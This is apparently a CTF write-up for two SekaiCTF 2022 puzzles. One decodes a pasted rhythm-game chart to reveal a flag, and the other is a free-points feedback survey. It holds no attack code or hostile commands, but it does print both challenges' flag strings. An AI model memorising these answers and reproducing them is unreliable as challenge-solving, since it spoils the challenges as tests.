#0171a:11
#01719:11000011000000000000000000000000
#01712:22
#0171c:00000012000000000000000000000000
#01716:00000012000000000000000000000000
#01818:23
#01813:1414000000000000
#01819:00130013000000130000000000000000
#01816:0000000000000000001200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#01812:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0181b:00130000
#00154:62620000
#00156:0000000000000000002200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00152:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000222600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0035b:00630000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0035a:00000000002300000000000000230000000000000000000000000000002300000000000000000000000000000000000000000000000000000000000000000000
#00358:00000000000000000000000000000000006300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00454:62620000
#0045a:61
#0045b:61
#00456:0000000000000000002200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00458:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0045c:0022000000000000
#00452:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000222600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00554:62
#00558:2222000000000000
#0055c:6222000000000000
#0065a:21
#00659:21000021000000000000000000000000
#0065c:00000022000000000000000000000000
#00656:00000022000000000000000000000000
#00752:2121000000000000
#00755:6121000000000000
#00852:0000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#00952:22
#00956:62
#00958:2222000000000000
#0095c:6222000000000000
#00954:00000024000000000000000000000000
#0105a:61
#0105b:61
#01058:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0105c:0022000000000000
#01155:61
#01154:61
#01156:220000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0115a:62
#01152:0022000000000000
#0115c:00220000
#01258:00000026000000000000000000000000
#01359:62
#0135c:62
#0135b:61
#01452:2222000000000000
#01456:6222000000000000
#01558:00000026000000000000000000000000
#0165b:62
#01652:00000026000000000000000000000000
#0175a:21
#01759:21000021000000000000000000000000
#0175c:00000022000000000000000000000000
#01756:00000022000000000000000000000000
#01752:00120000
#01858:63
#01853:6464000000000000
#01859:00230023000000230000000000000000
#01856:0000000000000000002200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#01852:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000022260000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0185b:00630000
#001340:12522200
#001320:00000000000000000000000000000000560000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000525600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#001360:0000000000000000005200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#001381:0016000000000000000000003632000000000000000000000000003236000000000000003632000000000000000000000000003236000000000000000000002600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#002320:1222
#002361:1222
#002341:00520000
#002382:12
#0023a2:0021
#0023c3:12
#0023b3:0021
#003320:16560000000000562600000000000000
#003340:0000000000000000005200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000052000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0033b1:00130000000000000000000000000000000000000000000000000000000000000023000000000000000000000000000000000000000000000000000000000000
#0033a1:00000000005300000000000000530000000000000053000000000000005300000000000000000000000000000000000000000000000000000000000000000000
#003381:00000000000000000000000000000000005300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#004340:12522200
#004320:00000000000000000000000000000000560000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000525600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#004360:0000000000000000005200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0043a1:11210000
#004381:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000052000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0043b2:11210000
#0043c2:0052000000000000
#004383:1222
#005340:12
#005330:0000000000000000545200000000000000000000000000000000005200000000005200000000000022000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#005320:0000000000000055550000000000000000000000000000000000000000000000
#005381:12220000
#0053c2:1252000000000000
#0053b2:00220000
#005383:0012000000000000
#0053a3:00210000
#006320:120000000000000000000000000000000000000000000000000000000000000000000000000000000052540000000000000000000000545200000000000000000000000000000000000000000000000000000052540000000000000000000000240000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#006361:12220000
#0063c2:12000052000000000000000000000000
#0063b2:00220000
#0063a3:11000031000000000000000000000000
#006393:00210000
#006394:11000031000000000000000000000000
#0063a4:00210000
#006365:00000012000000000000000000000000
#006385:00210000
#007320:11210000
#007351:1151000000000000
#007341:00210000
#007372:11
#007362:0021
#007383:11
#007393:0021
#0073b4:11
#0073a4:0021
#0073c5:11
#0073d5:0021
#007326:0011000000000000
#007336:00210000
#008320:1c0000000000000000000000000000005c540000000000000000000000000000000000000000000000000000000000005c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0083a0:0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000540000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#008350:0026
#009320:1222
#009361:120000000000000000000000000000000000000000000000000000000000000000000032000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000220000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#009341:00000054340000000000000000000000
#009382:12220000
#0093c3:1252000000000000
#0093b3:00220000
#009384:0012000000000000
#0093a4:00210000
#0103a0:11210000
#010380:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000052000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#0103b1:11210000
#0103c1:0052000000000000
#010382:1222
#010343:120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#010363:0022
#010344:00120000
#010324:0022
#011350:11210000
#011360:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000052000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#011341:11210000
#011321:0052000000000000
#011362:1222
#011383:1222
#0113a4:1222
#0113c4:00520000
#012320:12002212
#012361:12220000
#012341:0052000000000000
#012382:12220000
#012383:00000016000000000000000000000000
#0123a3:00220000
#013360:00220000
#013341:12
#013321:00220000
#013392:12
#013382:0052220000000000
#0133c3:12220000
#0133b4:11
#0133c4:0022000000000000
#014320:12220000
#014361:1252000000000000
#014351:00220000
#0143a2:120000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000032000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#014382:0000003626000000
#014323:0012000000000000
#014343:00210000
#015320:1222
#015361:12220000
#015341:0052000000000000
#015382:12220000
#015383:00000016000000000000000000000000
#0153a3:00220000
#016320:12220000
#0163b1:12
#0163a1:0000000000000000545200000000000000000000000000000000005200000000005200000000000022000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#016391:0000000000000055550000000000000000000000000000000000000000000000
#016322:00000016000000000000000000000000
#016342:00220000
#017360:12220000
#0173c1:12000052000000000000000000000000
#0173b1:00220000
#0173a2:11000031000000000000000000000000
#017392:00210000
#017393:11000031000000000000000000000000
#0173a3:00210000
#017324:12220000
#017365:00000012000000000000000000000000
#017385:00210000
#018380:1323
#018390:00530053005300530000000000000000
#0183b0:00530000
#018331:1454240000000000
#018321:00000000000000000000000000000000560000000000000000000000000000000000000000000000000000000000000052560000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
#018361:0000000000000000005200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Simply just copy and paste everything and press convert and we can see the flag from bottom-up.

<figure><img src=".gitbook/assets/image (978).png" alt=""><figcaption></figcaption></figure>

Note that there are other ways to solve this as well. You could use other tools [here](https://paletteworks.mkpo.li/), [here ](https://github.com/crash5band/MikuMikuWorld)or [here](https://github.com/paralleltree/Ched).

Flag: SEKAI{SbtnFmnW2HnYbdDkryunTkrrtims}

## Survey

<figure><img src=".gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>

For this challenge, it is similar to this challenge [here](https://gadiel-lau.gitbook.io/2022-writeups/downunderctf-2022#survey). Nowadays, the CTFs on the CTFtime platform would include this `survey` challenge to reward you free points for doing their survey and providing feedback at the end of their event. A challenge but not really a challenge.

At the end of the survey, the flag is displayed as an image.

<figure><img src=".gitbook/assets/image (723).png" alt=""><figcaption></figcaption></figure>

Flag: SEKAI{thx\_for\_playing\_SekaiCTF\_2022}

If you are interested on the other CTF challenges in SEKAICTF, check out the official challenge source code and writeups [here](https://github.com/project-sekai-ctf/sekaictf-2022).
